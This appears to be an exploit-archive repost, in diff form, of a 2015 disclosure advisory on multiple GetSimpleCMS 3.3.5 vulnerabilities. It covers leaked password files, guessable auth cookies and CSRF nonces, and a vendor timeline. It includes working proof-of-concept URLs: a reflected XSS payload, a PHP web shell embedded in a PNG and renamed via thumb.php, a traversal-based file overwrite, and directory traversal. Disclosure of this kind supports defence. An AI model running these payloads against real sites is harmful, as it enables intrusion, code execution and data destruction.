@@ -1,0 +1,233 @@
+id: 23893
+date: 07/17/2015
+title: GetSimpleCMS 3.3.5 Multiple Vulnerabilities
+author: Tim Coen
+cves: 
+
+Vulnerability: XSS, Code Execution, DOS, Password Leak, Weak Authentication
+Affected Software: GetSimpleCMS (http://get-simple.info/)
+Affected Version: 3.3.5 (probably also prior versions)
+Patched Version: 3.3.6 (partial fix)
+Risk: Medium-High
+Vendor Contacted: 2015-06-14
+Vendor Partial Fix: 2015-07-14
+Public Disclosure: 2015-07-15
+
+
+GetSimple CMS is a content management system written in PHP. It does not
+use a DBMS, but xml files instead.
+
+There are various vulnerabilities in version 3.3.5, most of which are
+fixed in version 3.3.6.
+
+For version 3.3.6 **it is important that the htaccess file of GetSimple
+CMS is read by the server**, as otherwise passwords and other sensitive
+information will be disclosed (the functionality of the website itself
+is not affected by an unread htaccess file, so it might go unnoticed).
+
+
+Password Leak (only partially fixed)
+=============
+
+Risk
+----
+
+Medium-High; Passwords may leak, depending on Server configuration
+
+Description
+-----------
+
+A lot of sensitive information is stored in .xml files inside the
+web root. The .htaccess file of GetSimpleCMS does prevent access to .xml
+files, but if the htaccess file is not used - for example because
+AllowOverride None is set (eg for performance or security reasons) -
+these files become readable. There is no warning in the admin area for
+when this is happening.
+
+Additionally, backups of these files may be stored with the
+extension .bak, access to which is not denied by the .htaccess file.
+
+The mentioned files can for example be found at the following locations:
+
+http://localhost/GetSimpleCMS-3.3.5/backups/users/username.xml.bak
+http://localhost/GetSimpleCMS-3.3.5/data/users/username.xml
+
+Other xml files contain further sensitive information.
+
+Mitigation / Comments on Vendor Fix
+-----------------------------------
+
+The vendor now also forbids access to .bak files. Other than that,
+this issue was not fixed by the vendor, as it is not an issue if the
+user has configured the webserver in a specific way.
+
+Because of this, **it is extremely important that AllowOverride None
+is set**.
+
+Insufficient Cookie Authentication (not fixed)
+==================================
+
+Risk
+----
+
+Medium; Authentication bypass, depending on Server configuration
+
+Description
+-----------
+
+The cookie used to authenticate users does not contain truly random
+data, and never changes. It does contain:
+
+- $USR (user name)
+- $SALT (per default a value stored in
+localhost/GetSimpleCMS-3.3.5/data/other/authorization.xml, see above)
+- $cookie_name (contains the site name and the site version, none of
+which should be sensitive information, and can be easily found in
+various files)
+
+Depending on server configuration, it is relatively easy for an
+attacker to retrieve all of these values, which would enable them to log
+in as any user.
+
+Insufficient CSRF Protection (not fixed)
+============================
+
+Risk
+----
+
+Low-Medium; CSRF protection can be bypassed, depending on Server
+configuration
+
+Description
+-----------
+
+The CSRF nonce does not contain truly random data and may thus be
+guessed by an attacker. It does contain:
+
+- $action (known to attacker)
+- $file (known to attacker)
+- $SALT (site salt, see above)
+- $uid (user agent)
+- $time (two hour window)
+- $USR (user name)
+
+$time is not a problem. If an attacker wants to, they can automatically
+update it in their attack code.
+This leaves the user agent. There are a lot of lists with the most
+common user agents available, and they cover a high percentage of used
+user agents, so this value can also relatively easily be guessed by an
+attacker.
+
+Reflected XSS
+=============
+
+Risk
+----
+
+Medium; arbitrary javascript execution, which can lead to CSRF
+protection bypass, which in this case leads to arbitrary code execution
+via eg the theme editor
+
+POC
+---
+
+http://localhost/GetSimpleCMS-3.3.5/admin/filebrowser.php?returnid=foobar&func=foobar %3D%3D 'function') {}}}alert(1); </script>
+
+Code Execution (Admin)
+======================
+
+Risk
+----
+
+Medium; An admin can execute arbitrary PHP code without using the
+designated theme editor (this is bad because some users might disable
+the theme editor for security reasons)
+
+POC
+---
+
+1. A valid image file with PHP code inside is needed (can eg be
+created by creating a 1x1 png via gimp, and editing "created by gimp" in
+vim to be <?php passthru($_GET['c']); ?>)
+2. Upload image
+3. rename file extensions:
+http://localhost/GetSimpleCMS-3.3.5/admin/inc/thumb.php?src=evil.png&dest=evil.php
+4. visit PHP shell:
+http://localhost/GetSimpleCMS-3.3.5/data/thumbs/evil.php?c=id
+
+
+DOS (via CSRF)
+==============
+
+Risk
+----
+
+Medium; Relevant System files can be destroyed by an admin or by an
+attacker if admin visits their website
+
+Description
+-----------
+
+Any file on the system that the web user has access to can be
+overwritten with an image file that already exists on the server.
+Credentials are required, but the request is not protected by CSRF
+protection.
+
+POC
+---
+
+http://localhost/GetSimpleCMS-3.3.5/admin/inc/thumb.php?src=evil.png&dest=.../...//.../...//.../...//.../...//.../...//var/www/important
+
+
+Code Execution (Admin, not with default config)
+===============================================
+
+Risk
+----
+
+Minimal; requires admin credentials and custom configuration
+
+Description
+-----------
+
+The function that validates file types can work with a blacklist
+(default) or a whitelist.
+
+The function works fine with default configuration. But if a user were
+to use the whitelist approach, it would introduce a vulnerability, as
+the validation then only relies on the given mime type, which is
+entirely user controlled.
+
+
+Directory Traversal
+===================
+
+Risk
+----
+
+minimal; it is possible to go up one directory when viewing files
+
+POC
+---
+
+localhost/GetSimpleCMS-3.3.5/admin/theme-edit.php?t=..&f=gsconfig.php&s=Edit
+
+Timeline
+========
+
+2015-06-14: Requesting Contact Email via official forum
+2015-06-15: Vendor Reply
+2015-06-15: Send Advisory
+2015-06-16: Vendor Confirmation, Issues opened
+2015-06-22: Vendor Released Partial Fix as Beta Version
+2015-07-13: Disclosure Announced
+2015-07-13: Vendor Confirmation
+2015-07-14: Vendor Releases Partial Fix
+2015-07-15: Disclosure
+
+Source
+======
+
+http://software-talk.org/blog/2015/07/getsimplecms-3-3-5-xss-code-execution-dos-password-leak-weak-authentication-misc/
+
+#  0day.today [2023-03-26]  #
